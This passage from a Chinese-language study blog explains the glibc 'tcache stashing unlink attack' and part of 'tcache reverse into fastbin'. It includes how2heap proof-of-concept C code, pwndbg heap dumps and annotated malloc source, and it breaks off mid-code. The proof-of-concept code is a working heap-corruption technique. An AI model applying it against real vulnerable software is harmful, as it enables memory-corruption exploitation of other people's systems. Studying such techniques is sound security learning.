<p>有一点需要注意的是，放入 tcache bin的条件是tcache bin有空余，且fastbin取出后也有剩余。后者的判断方法是取出表头的fd指针指向的下一个chunk，判断是否为空。也就是从头部开始取的，再使用头插法插入 tcache bin。这样的话，排入tcache bin 后chunks的顺序就是与其在fastbin中是相反的，所以叫reverse。<br>这点可以与small bin对比学习，具体可以查看我关于 house of lore 的记录。<br>在small bin中，判断方法是取出尾部chunk判读是否等于表头，也就是从链表尾开始取再使用头插法插入tcache bin。顺序与其在small bin是相同的。<br>这段进行完之后，再查看一下tcache bin<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> bins</span><br><span class="line">(0x50)     fastbin[3]: 0xfffffff800000002 (invaild memory)</span><br><span class="line">                  top: 0x5555557576f0 (size : 0x20910) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x50)   tcache_entry[3](7): 0x7fffffffda70 --&gt; 0x5555557574d0 --&gt; 0x555555757520 --&gt; 0x555555757570 --&gt; 0x5555557575c0 --&gt; 0x555555757610 --&gt; 0x555555757660</span><br></pre></td></tr></table></figure></p>
<p>由于先进后出原则，再次申请的时候就会从tcache bin中取出最后一个chunk，即伪造的chunk。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> bins</span><br><span class="line">(0x50)     fastbin[3]: 0xfffffff800000002 (invaild memory)</span><br><span class="line">                  top: 0x5555557576f0 (size : 0x20910) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x50)   tcache_entry[3](6): 0x5555557574d0 --&gt; 0x555555757520 --&gt; 0x555555757570 --&gt; 0x5555557575c0 --&gt; 0x555555757610 --&gt; 0x555555757660</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x &amp;stack_var</span><br><span class="line"><span class="meta">$</span>12 = 0x7fffffffda60</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x7fffffffda60</span><br><span class="line">0x7fffffffda60: 0x0000000000000000      0x0000000000008000</span><br><span class="line">0x7fffffffda70: 0x00005552aa8a8b2d      0xca7e1b97ec2170ee</span><br><span class="line">0x7fffffffda80: 0x0000555555757480      0x0000555555757430</span><br><span class="line">0x7fffffffda90: 0x00005555557573e0      0x0000555555757390</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p q</span><br><span class="line"><span class="meta">$</span>13 = (size_t *) 0x7fffffffda70</span><br></pre></td></tr></table></figure></p>
<h2 id="tcache-stashing-unlink-attack-glibc2-34"><a href="#tcache-stashing-unlink-attack-glibc2-34" class="headerlink" title="tcache_stashing_unlink_attack_glibc2.34"></a>tcache_stashing_unlink_attack_glibc2.34</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><ol>
<li>malloc遍历unsorted bin找合适chunk的时候，如果不是恰好合适的大小，就会将其放入对应的small bin或者large bin。如果大小是small bin中的chunk，头插法插入对应链表。</li>
<li>calloc并不会首先从tcache bin中取chunk，而是遍历fast bin、small bin、large bin这些。</li>
<li>从small bin中取出一个chunk后，如果tcache bin有空余，会向剩余位置链入small bin中剩下的chunk。但是只检查了尾部一个的bk指针，并没有全部检查。</li>
</ol>
<h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This file demonstrates the stashing unlink attack on tcache.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stack_var emulates the fake chunk we want to alloc to.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"First let's write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You can see the value of fake_chunk-&gt;bk is:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc 9 chunks with malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n"</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> stack_var[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> *x[<span class="number">10</span>];</span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">size_t</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++) x[i] = (<span class="keyword">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">10</span>;i++) <span class="built_in">free</span>(x[i]);</span><br><span class="line">    <span class="built_in">free</span>(x[<span class="number">0</span>]);<span class="comment">//into unsorted bin, x[1] avoid merge</span></span><br><span class="line">    <span class="built_in">free</span>(x[<span class="number">2</span>]);<span class="comment">//into unsorted bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">// bigger so all into small bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// cash one from tcache bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// cash one from tcache bin</span></span><br><span class="line">    x[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">size_t</span>)stack_var;  <span class="comment">//poison smallbin</span></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x80</span>); <span class="comment">// cash x[0] from smallbin, move the other 2 into tcache bin</span></span><br><span class="line">    assert(<span class="built_in">malloc</span>(<span class="number">0x80</span>) == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwngdb调试"><a href="#pwngdb调试" class="headerlink" title="pwngdb调试"></a>pwngdb调试</h3><p>首先声明了一个fake_chunk和一个指针数组。<br>然后将fake_chunk的bk指针指向一个可以写入的地址<code>&amp;stack_var[2]</code>。第一个for循环将申请的0x80大小的chunk地址都存入指针数组。然后free掉后7个chunk，填满tcache bin。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">                  top: 0x555555757830 (size : 0x207d0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x90)   tcache_entry[7](7): 0x5555557577b0 --&gt; 0x555555757720 --&gt; 0x555555757690 --&gt; 0x555555757600 --&gt; 0x555555757570 --&gt; 0x5555557574e0 --&gt; 0x555555757450</span><br></pre></td></tr></table></figure></p>
<p>这时候再free掉x[0]和x[2]，它们进入unsorted bin。中间隔一个x[1]是为了防止合并。合并在unsafe unlink中讲过了。<br>合并：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>malloc时，如果在遍历unsorted bin的时候，遍历到的chunk不是恰好合适的大小，就会将这个遍历过的chunk放入对应的small bin或者large bin中。所以再次malloc一个比0x80大的size，以便将x[0]与x[2]放入small bin。<br>将源码中的关键部分摘出来：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果申请的大小在small bin范围内</span></span><br><span class="line"><span class="comment">//首先检查small bin</span></span><br><span class="line"><span class="comment">//其实我们这里直接跳出去了，因为small bin是空的</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//获取索引</span></span><br><span class="line">	idx = smallbin_index (nb);</span><br><span class="line">	<span class="comment">//获取链表头</span></span><br><span class="line">	bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果链表尾等于链表头，说明链表为空。</span></span><br><span class="line">	<span class="comment">//这里是如果不等于链表头</span></span><br><span class="line">	<span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//取出倒数第二个chunk</span></span><br><span class="line">		bck = victim-&gt;bk;</span><br><span class="line">		<span class="comment">//检查BK的fd指针是否指向链表尾</span></span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">			malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">		set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">		<span class="comment">//BK当作最后链表尾</span></span><br><span class="line">		bin-&gt;bk = bck;</span><br><span class="line">		bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (victim);</span><br><span class="line">		check_malloced_chunk (av, victim, nb);</span><br><span class="line">		<span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">		<span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		stash them in the tcache.  */</span></span><br><span class="line">		<span class="comment">//这里跳过了</span></span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">		<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		<span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">		alloc_perturb (p, bytes);</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">tcache_nb = nb;</span><br><span class="line"><span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">//从unsorted</span></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//通过bk指针从尾部遍历unsorted bin，只剩头结点的时候结束</span></span><br><span class="line">	<span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">	&#123;</span><br><span class="line">		bck = victim-&gt;bk;</span><br><span class="line">		size = chunksize (victim);</span><br><span class="line">		mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ) || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">			malloc_printerr (<span class="string">"malloc(): invalid size (unsorted)"</span>);</span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ) || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">			malloc_printerr (<span class="string">"malloc(): invalid next size (unsorted)"</span>);</span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">			malloc_printerr (<span class="string">"malloc(): mismatching next-&gt;prev_size (unsorted)"</span>);</span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)|| __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">			malloc_printerr (<span class="string">"malloc(): unsorted double linked list corrupted"</span>);</span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">			malloc_printerr (<span class="string">"malloc(): invalid next-&gt;prev_inuse (unsorted)"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* remove from unsorted list */</span></span><br><span class="line">		<span class="comment">//检查BK的fd指针是否指向链表尾</span></span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">			malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">		<span class="comment">//BK作为链表尾，因为尾部chunk被取走了</span></span><br><span class="line">		unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">		bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* place chunk in bin */</span></span><br><span class="line">		<span class="comment">//取出unsorted bin中的chunk放入small bin</span></span><br><span class="line">		<span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//获取索引</span></span><br><span class="line">			victim_index = smallbin_index (size);</span><br><span class="line">			<span class="comment">//头插法</span></span><br><span class="line">			bck = bin_at (av, victim_index);</span><br><span class="line">			fwd = bck-&gt;fd;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来两个malloc(0x80)从tcache bin中取出两个chunk，制造空位。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">                  top: 0x555555757940 (size : 0x206c0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x090)  smallbin[ 7]: 0x5555557573b0  &lt;--&gt; 0x555555757290</span><br><span class="line">(0x90)   tcache_entry[7](5): 0x555555757690 --&gt; 0x555555757600 --&gt; 0x555555757570 --&gt; 0x5555557574e0 --&gt; 0x555555757450</span><br></pre></td></tr></table></figure></p>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/stash_bins1.png" alt><br>这时候把x[2]的bk指针修改为fake_chunk，将fake_chunk也链入small bin，作为链表头。<br>注意bk指针的位置存的也是一个chunk结构体（的地址），详见上一篇文章。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/stash_bins2.png" alt><br>原本x[2]的bk指针应指向链表头，如下图所示：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/stash_smallbin1.png" alt><br>修改bk指针后，如下图所示：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/stash_smallbin2.png" alt><br>fakechunk：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/stash_fakechunk.png" alt><br>然后calloc一个0x80大小的chunk。calloc会直接调用int_malloc函数，而不是tcache_get函数。即如果对应大小的small bin不为空，会首先从small bins中取chunk。<br>这是calloc：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/stash_calloc.png" alt><br>这是malloc：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/stash_malloc.png" alt><br>small bin的这条链这时有三个chunk，x[0]，x[2]和fake_chunk。从链表尾部取走x[0]后，发现对应tcache bin还有两个空位，所以就会把x[2]和fake_chunk链入tcache bin。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//看当前small bin是否有剩余chunk，当前tcache bin是否满了</span></span><br><span class="line"><span class="comment">//如果small bin有剩余，tcache bin没满，就把small bin中剩余的chunk链入tcache bin</span></span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">	mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	<span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//通过bk指针从尾部遍历small bin</span></span><br><span class="line">			bck = tc_victim-&gt;bk;</span><br><span class="line">			<span 